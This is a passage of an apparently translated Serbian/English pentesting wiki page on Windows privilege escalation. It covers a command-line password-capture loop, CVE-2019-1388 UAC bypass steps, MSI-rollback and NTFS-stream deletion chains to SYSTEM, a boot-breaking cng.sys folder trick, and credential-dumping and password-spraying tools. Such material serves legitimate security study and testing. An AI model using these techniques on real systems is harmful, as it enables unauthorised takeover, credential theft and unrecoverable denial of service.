Takođe, sledeći alat omogućava **presretanje komunikacije preko named pipe-a pomoću alata kao što je burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **i ovaj alat omogućava listanje i pregled svih pipe-ova kako bi se pronašli privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### File Extensions that could execute stuff in Windows

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

Kada dobijete shell kao korisnik, mogu postojati zakazani zadaci ili drugi procesi koji se izvršavaju i koji **prosleđuju kredencijale putem komandne linije**. Skripta ispod beleži komandne linije procesa svake dve sekunde i upoređuje trenutno stanje sa prethodnim, ispisujući sve razlike.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Krađa lozinki iz procesa

## Od Low Priv User do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (putem konzole ili RDP) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili neki drugi proces kao "NT\AUTHORITY SYSTEM" iz naloga bez privilegija.

To omogućava eskalaciju privilegija i zaobilaženje UAC-a istovremeno koristeći istu ranjivost. Dodatno, nema potrebe ništa instalirati, a binarni fajl koji se koristi tokom procesa potpisan je i izdat od strane Microsoft-a.

Neki od pogođenih sistema su sledeći:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Da biste iskoristili ovu ranjivost, potrebno je izvršiti sledeće korake:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Pročitajte ovo da **saznate o Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da biste naučili o UAC i UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Napad se u suštini sastoji od zloupotrebe rollback funkcionalnosti Windows Installer-a da bi se legitimni fajlovi zamenili malicioznim tokom procesa deinstalacije. Za ovo napadač mora kreirati **malicious MSI installer** koji će biti iskorišćen za hijack-ovanje `C:\Config.Msi` foldera, koji će kasnije Windows Installer koristiti za čuvanje rollback fajlova tokom deinstalacije drugih MSI paketa gde su rollback fajlovi modifikovani da sadrže maliciozni payload.

Sažeta tehnika je sledeća:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Kreirajte `.msi` koji instalira bezopasan fajl (npr. `dummy.txt`) u upisiv folder (`TARGETDIR`).
- Obeležite installer kao **"UAC Compliant"**, tako da ga **non-admin user** može pokrenuti.
- Držite otvoren **handle** ka fajlu nakon instalacije.

- Step 2: Begin Uninstall
- Deinstalirajte isti `.msi`.
- Proces deinstalacije počinje premeštanje fajlova u `C:\Config.Msi` i preimenovanje u `.rbf` fajlove (rollback bekapi).
- **Poll the open file handle** koristeći `GetFinalPathNameByHandle` da detektujete kada fajl postane `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- `.msi` sadrži **custom uninstall action (`SyncOnRbfWritten`)** koja:
- Signalizira kada je `.rbf` napisan.
- Zatim **čeka** na drugi event pre nego što nastavi deinstalaciju.

- Step 4: Block Deletion of `.rbf`
- Kada se signal primi, **otvorite `.rbf` fajl** bez `FILE_SHARE_DELETE` — ovo **sprečava njegovo brisanje**.
- Zatim **signalizirajte nazad** da deinstalacija može da se završi.
- Windows Installer ne uspeva da obriše `.rbf`, i pošto ne može da obriše sav sadržaj, **`C:\Config.Msi` nije obrisan**.

- Step 5: Manually Delete `.rbf`
- Vi (napadač) ručno obrišete `.rbf` fajl.
- Sada je **`C:\Config.Msi` prazan**, spreman za hijack.

> U ovom trenutku, **trigger the SYSTEM-level arbitrary folder delete vulnerability** da obrišete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Ponovo kreirajte `C:\Config.Msi` folder sami.
- Postavite **weak DACLs** (npr. Everyone:F), i **držite otvoren handle** sa `WRITE_DAC`.

- Step 7: Run Another Install
- Instalirajte `.msi` ponovo, sa:
- `TARGETDIR`: upisiva lokacija.
- `ERROROUT`: promenljiva koja izaziva prisilni fail.
- Ova instalacija će ponovo biti iskorišćena da trigger-uje **rollback**, koji čita `.rbs` i `.rbf`.

- Step 8: Monitor for `.rbs`
- Koristite `ReadDirectoryChangesW` da nadgledate `C:\Config.Msi` dok se ne pojavi novi `.rbs`.
- Zabeležite njegovo ime fajla.

- Step 9: Sync Before Rollback
- `.msi` sadrži **custom install action (`SyncBeforeRollback`)** koja:
- Signalizira event kada je `.rbs` kreiran.
- Zatim **čeka** pre nego što nastavi.

- Step 10: Reapply Weak ACL
- Nakon prijema ` .rbs created` event-a:
- Windows Installer **reapplies strong ACLs** na `C:\Config.Msi`.
- Ali pošto još uvek držite handle sa `WRITE_DAC`, možete ponovo **reapply weak ACLs**.

> ACLs su **only enforced on handle open**, tako da i dalje možete pisati u folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite-ujte `.rbs` fajl lažnim rollback skriptom koji kaže Windows-u da:
- Restore-uje vaš `.rbf` fajl (malicious DLL) u **privileged location** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Postavi vaš lažni `.rbf` koji sadrži **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signalizirajte sync event da installer nastavi.
- A **type 19 custom action (`ErrorOut`)** je konfigurisana da **namerno fail-uje instalaciju** u poznatoj tački.
- Ovo uzrokuje da **rollback počne**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Čita vaš maliciozni `.rbs`.
- Kopira vaš `.rbf` DLL u ciljnu lokaciju.
- Sada imate svoj **malicious DLL u putanji koju učitava SYSTEM**.

- Final Step: Execute SYSTEM Code
- Pokrenite pouzdan **auto-elevated binary** (npr. `osk.exe`) koji učitava DLL koji ste hijack-ovali.
- **Boom**: vaš kod se izvršava **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Glavna MSI rollback tehnika (prethodna) pretpostavlja da možete obrisati **čitav folder** (npr. `C:\Config.Msi`). Ali šta ako vaša ranjivost dozvoljava samo **arbitrary file deletion**?

Možete iskoristiti **NTFS internals**: svaki folder ima skriven alternativni data stream nazvan:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ovaj stream čuva **indeksne metapodatke** direktorijuma.

Dakle, ako **obrišete `::$INDEX_ALLOCATION` stream** direktorijuma, NTFS **uklanja ceo direktorijum** iz fajl-sistema.

Možete to uraditi koristeći standardne API-je za brisanje fajlova, kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Iako pozivate *file* delete API, to **briše sam folder**.

### Od Folder Contents Delete do SYSTEM EoP
Šta ako vaš primitive ne dozvoljava da brišete proizvoljne files/folders, ali ono **dozvoljava brisanje *contents* foldera pod kontrolom napadača**?

1. Korak 1: Postavite mamac folder i file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavite **oplock** na `file1.txt`
- The oplock **pauzira izvršavanje** kada privilegovani process pokuša da obriše `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Korak 3: Pokreni SYSTEM proces (npr., `SilentCleanup`)
- Ovaj proces skenira foldere (npr., `%TEMP%`) i pokušava da obriše njihov sadržaj.
- Kada stigne do `file1.txt`, **oplock triggers** i predaje kontrolu tvom callback-u.

4. Korak 4: Unutar oplock callback-a – preusmeri brisanje

- Opcija A: Premesti `file1.txt` na drugo mesto
- Ovo prazni `folder1` bez prekidanja oplock-a.
- Ne briši `file1.txt` direktno — to bi prerano oslobodilo oplock.

- Opcija B: Pretvori `folder1` u **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opcija C: Kreirajte **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Ovo cilja NTFS internal stream koji čuva metapodatke foldera — brisanjem tog streama briše se folder.

5. Korak 5: Oslobodite oplock
- SYSTEM proces nastavlja i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction + symlink, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Rezultat**: `C:\Config.Msi` je obrisan od strane SYSTEM.

### Od Arbitrary Folder Create do trajnog DoS-a

Iskoristite primitiv koji vam omogućava da **kreirate proizvoljan folder kao SYSTEM/admin** — čak i ako **ne možete pisati fajlove** ili **postaviti slabe dozvole**.

Kreirajte **folder** (ne fajl) sa imenom **kritičnog Windows drajvera**, npr.:
```
C:\Windows\System32\cng.sys
```
- Ova putanja obično odgovara drajveru u kernel režimu `cng.sys`.
- Ako ga **unapred kreirate kao folder**, Windows neće uspeti da učita stvarni drajver pri pokretanju.
- Zatim, Windows pokušava da učita `cng.sys` tokom pokretanja.
- Windows vidi folder, **ne uspeva da razreši stvarni drajver**, i **sistem se sruši ili zaustavi pokretanje**.
- Ne postoji **fallback**, i **nema oporavka** bez spoljne intervencije (npr. popravke pokretanja ili pristupa disku).


## **From High Integrity to System**

### **Novi servis**

Ako već radite u procesu sa High Integrity, **put do SYSTEM-a** može biti jednostavan — dovoljno je **kreirati i pokrenuti novi servis**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Kada pravite service binary, pobrinite se da je validan service ili da binary izvršava potrebne akcije brzo, jer će biti ubijen za 20s ako nije validan service.

### AlwaysInstallElevated

Iz High Integrity procesa možete pokušati da omogućite AlwaysInstallElevated registry unose i instalirate reverse shell koristeći _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Možete** [**naći kod ovde**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ako imate te token privilegije (verovatno ćete ih naći u već postojećem High Integrity procesu), bićete u mogućnosti da **otvorite gotovo bilo koji proces** (ne protected processes) sa SeDebug privilegijom, **kopirate token** procesa i kreirate **arbitraran proces sa tim tokenom**.\
Korišćenjem ove tehnike obično se **odabere proces koji se izvršava kao SYSTEM sa svim token privilegijama** (_da, možete naći SYSTEM procese bez svih token privilegija_).\
**Možete naći** [**primer koda koji izvodi ovu tehniku ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter za escalaciju u `getsystem`. Tehnika se sastoji iz **kreiranja pipe-a i potom kreiranja/abuziranja servisa da upiše u taj pipe**. Zatim, **server** koji je napravio pipe koristeći **`SeImpersonate`** privilegiju će moći da **impersonira token** pipe klijenta (servis) i dobije SYSTEM privilegije.\
Ako želite da [**saznate više o name pipes trebalo bi da pročitate ovo**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**kako da odete iz high integrity do System koristeći name pipes trebalo bi da pročitate ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **hijack-ujete dll** koji se **učitava** od strane **procesa** koji se izvršava kao **SYSTEM**, moći ćete da izvršite arbitrarni kod sa tim privilegijama. Dakle, Dll Hijacking je takođe koristan za ovaj tip eskalacije privilegija, i, što je još važnije, mnogo je **lakši za postizanje iz high integrity procesa** jer će imati **write permisije** na folderima koji se koriste za učitavanje dll-ova.\
**Možete** [**saznati više o Dll hijackingu ovde**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Više pomoći

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Korisni alati

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava za misconfigurations i sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava za moguće misconfigurations i prikuplja info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava za misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izvlači PuTTY, WinSCP, SuperPuTTY, FileZilla, i RDP sačuvane session informacije. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Ekstrahuje credentials iz Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray-uje prikupljene lozinke po domeni**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer i man-in-the-middle alat.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna privesc Windows enumeracija**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Pretražuje poznate privesc ranjivosti (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(treba Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Pretražuje poznate privesc ranjivosti (treba kompajlirati korišćenjem VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriše host tražeći misconfigurations (više alat za prikupljanje info nego privesc) (treba kompajlirati) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Ekstrahuje kredencijale iz mnogih softvera (precompiled exe na github-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp-a u C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Proverava za misconfigurations (exe precompiled na github-u). Ne preporučuje se. Ne radi dobro na Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava za moguće misconfigurations (exe iz python-a). Ne preporučuje se. Ne radi dobro na Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen zasnovan na ovom postu (ne zahteva accesschk da bi radio pravilno ali može da ga koristi).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz **systeminfo** i preporučuje radne exploite (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz **systeminfo** i preporučuje radne exploite (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Morate kompajlirati projekat koristeći odgovarajuću verziju .NET-a ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET na žrtvinom hostu možete uraditi:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referencije

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
